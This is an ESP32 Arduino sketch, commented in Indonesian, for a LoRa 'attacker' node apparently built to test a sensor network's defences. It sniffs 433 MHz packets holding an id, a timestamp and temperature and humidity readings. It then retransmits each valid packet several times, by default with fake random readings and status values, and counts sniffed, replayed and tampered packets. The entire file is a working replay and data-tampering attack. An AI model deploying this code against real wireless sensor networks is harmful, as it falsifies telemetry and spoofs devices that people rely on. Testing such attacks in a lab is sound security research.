#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

// =====================================
// PARAMETER
// =====================================
const uint32_t EXPECTED = 300;
const unsigned long TIMEOUT_MS = 30000;

// =====================================
// METRICS
// =====================================
uint32_t sniffedCount   = 0;
uint32_t decodedCount   = 0;
uint32_t invalidCount   = 0;
uint32_t replayedCount  = 0;
uint32_t tamperedCount  = 0;

// =====================================
bool seen[300] = {false};
uint32_t uniqueCount = 0;
uint32_t duplicateCount = 0;

unsigned long lastRecvTime = 0;
bool started = false;
bool done = false;

// =====================================
// VALIDASI PAYLOAD
// =====================================
bool isValidPayload(String data, uint32_t &id) {

  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  if (p1 == -1 || p2 == -1) return false;

  String idStr = data.substring(0, p1);

  for (int i = 0; i < idStr.length(); i++) {
    if (!isDigit(idStr[i])) return false;
  }

  id = idStr.toInt();
  return true;
}

// =====================================
// RANDOM TAMPER FUNCTION
// =====================================
String tamperPayload(String data) {

  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  String id = data.substring(0, p1);
  String ts = data.substring(p1 + 1, p2);

  float fakeTemp = random(50, 500) / 10.0;
  float fakeHum  = random(50, 1000) / 10.0;

  String status;
  int r = random(0, 3);

  if (r == 0) status = "PANAS";
  else if (r == 1) status = "NORMAL";
  else status = "DINGIN";

  return id + "," + ts + "," +
         String(fakeTemp, 2) + "," +
         String(fakeHum, 2) + "," +
         status;
}

// =====================================
// SETUP
// =====================================
void setup() {

  Serial.begin(115200);
  randomSeed(micros());

  SPI.begin(18, 19, 23, SS);
  LoRa.setPins(SS, RST, DIO0);

  if (!LoRa.begin(433E6)) {
    Serial.println("LoRa init FAILED!");
    while (1);
  }

  LoRa.setSpreadingFactor(9);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);

  LoRa.receive();

  Serial.println("ATTACKER READY");
  Serial.println("MODE: RANDOM REPLAY + TAMPER");
}

// =====================================
// LOOP
// =====================================
void loop() {

  if (done) return;

  int packetSize = LoRa.parsePacket();
  if (!packetSize) return;

  started = true;
  lastRecvTime = millis();

  sniffedCount++;

  String data = "";
  while (LoRa.available()) {
    data += (char)LoRa.read();
  }

  if (data.startsWith("ACK,")) {
    Serial.print("");
    LoRa.receive();
    return;
  }

  uint32_t id = 0;
  bool valid = isValidPayload(data, id);

  if (valid) decodedCount++;
  else invalidCount++;

  Serial.print("[SNIFF] ");
  Serial.println(data);

  // =====================================
  // ATTACK CORE (FIXED RX/TX STABILITY)
  // =====================================
  if (valid) {

    int replayTimes = random(1, 5);

    Serial.print("[ATTACK] Replay x");
    Serial.println(replayTimes);

    // TX burst tanpa ganggu RX tiap loop
    LoRa.idle();

    for (int i = 0; i < replayTimes; i++) {

      delay(random(150, 600));

      String tampered = tamperPayload(data);     // ini mode replay + tamper, uncomment untuk replay dengan tamper
      // String tampered = data;                       // ini mode replay murni, uncomment untuk replay tanpa tamper

      tamperedCount++;
      replayedCount++;

      Serial.print("[TAMPER] ");      // ini log untuk payload yang sudah ditamper, uncomment untuk melihat payload yang sudah ditamper 
      // Serial.print("[REPLAY] ");      // ini log untuk payload yang direplay, uncomment untuk melihat payload yang direplay (baik yang tamper maupun yang tidak tamper)
      Serial.println(tampered);

      LoRa.beginPacket();
      LoRa.print(tampered);
      LoRa.endPacket();
    }

    // RX diaktifkan sekali setelah burst selesai
    LoRa.receive();
  }

  // =====================================
  // STOP CONDITION
  // =====================================
  if (sniffedCount >= EXPECTED) {
    done = true;
  }

  if (started && (millis() - lastRecvTime > TIMEOUT_MS)) {
    done = true;
  }
}